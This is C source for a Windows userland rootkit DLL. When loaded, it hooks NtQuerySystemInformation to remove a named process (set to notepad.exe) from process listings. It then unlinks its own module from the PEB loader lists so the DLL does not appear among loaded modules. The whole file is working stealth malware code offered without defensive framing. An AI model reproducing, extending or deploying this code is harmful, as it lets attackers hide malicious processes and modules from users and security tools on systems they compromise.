#include "rku.h"

unsigned char hide_me[] = "notepad.exe";
unsigned short whide_me[] = L"notepad.exe";


// unsigned char dll_name[] = "inf.dll";
// unsigned short sdll_name[] = L"inf.dll";
// unsigned short spath_dll[] = L"C:\\coding\\rootkit-userland\\inf.dll";


// unsigned char dll_name[MAX_PATH];
// unsigned short sdll_name[MAX_PATH];
unsigned short spath_dll[MAX_PATH];
int UnlinkPEBdll(void)
{
	UNICODE_STRING b;
	PEB *pPeb = (PEB *)__readgsqword(0x60);
	PEB_LDR_DATA *Ldr = pPeb->Ldr;
	LIST_ENTRY *ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY *pStartListEntry = ModuleList->Flink;
	LIST_ENTRY *prev_entry = pStartListEntry;
	WCHAR mystr[MAX_PATH] = {0};
	WCHAR substr[MAX_PATH] = {0};
	for (LIST_ENTRY *pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
	{

		MY_LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(pListEntry, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    #ifdef DEBUG
		wprintf(entry->FullDllName.Buffer);
		printf("\n");
    #endif
		if (custom_wcscmp(spath_dll, entry->FullDllName.Buffer) == 0)
		{
    #ifdef DEBUG
			printf("[+] Found and hid the dll\n");
    #endif
			entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
			entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
			entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
			entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
			entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;
			entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
			entry->HashTableEntry.Blink->Flink = entry->HashTableEntry.Flink;
			entry->HashTableEntry.Flink->Blink = entry->HashTableEntry.Blink;
		}
	}
	return 0;
}

typedef NTSTATUS (NTAPI* fpNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);


int hookNt(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
){
    fpNtQuerySystemInformation f;
    GVA(&f);
    if (SystemInformation != NULL && SystemInformationClass == SystemProcessInformation){
        NTSTATUS res = 0;
        res = f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        if (res != 0x0){
            return res;
        }
        PSYSTEM_PROCESS_INFORMATION SystemProcInfo =  (PSYSTEM_PROCESS_INFORMATION) SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prev = SystemProcInfo;
        while (TRUE) {
            if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, whide_me) == 0) {
                if (SystemProcInfo->NextEntryOffset){
                prev->NextEntryOffset =prev->NextEntryOffset+SystemProcInfo->NextEntryOffset;
                }
                else{
                    prev->NextEntryOffset = 0;
                }
            }
            else{
                prev = SystemProcInfo;
            }
            if (!SystemProcInfo->NextEntryOffset)
                break;
            SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
        }
        return res;
    }
    else{
        return f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            HookInfo hNtQ;
            fpNtQuerySystemInformation pnt;
            pnt = (fpNtQuerySystemInformation)_GetProcAddressNative("NtQuerySystemInformation");
            InstallHook(pnt, hookNt, &hNtQ);
            GetModuleFileNameW(hinstDLL, spath_dll, sizeof(spath_dll));
            UnlinkPEBdll();
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:

            if (lpvReserved != NULL)
            {
                break; // do not do cleanup if process termination scenario
            }
            // RemoveHook(pnt, &hNtQ);
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}